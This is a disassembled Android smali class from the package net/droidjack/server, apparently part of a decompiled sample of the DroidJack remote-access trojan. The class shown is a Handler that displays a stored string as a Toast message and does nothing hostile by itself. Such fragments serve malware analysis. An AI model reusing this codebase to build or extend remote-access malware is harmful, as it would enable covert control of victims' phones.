.class Lnet/droidjack/server/o;
.super Landroid/os/Handler;


# instance fields
.field final synthetic a:Lnet/droidjack/server/n;

.field private final synthetic b:Ljava/lang/String;


# direct methods
.method constructor <init>(Lnet/droidjack/server/n;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/o;->a:Lnet/droidjack/server/n;

    iput-object p2, p0, Lnet/droidjack/server/o;->b:Ljava/lang/String;

    invoke-direct {p0}, Landroid/os/Handler;-><init>()V

    return-void
.end method


# virtual methods
.method public dispatchMessage(Landroid/os/Message;)V
    .locals 0

    invoke-virtual {p0, p1}, Lnet/droidjack/server/o;->handleMessage(Landroid/os/Message;)V

    return-void
.end method

.method public handleMessage(Landroid/os/Message;)V
    .locals 3

    sget-object v0, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    iget-object v1, p0, Lnet/droidjack/server/o;->b:Ljava/lang/String;

    const/4 v2, 0x1

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    return-void
.end method
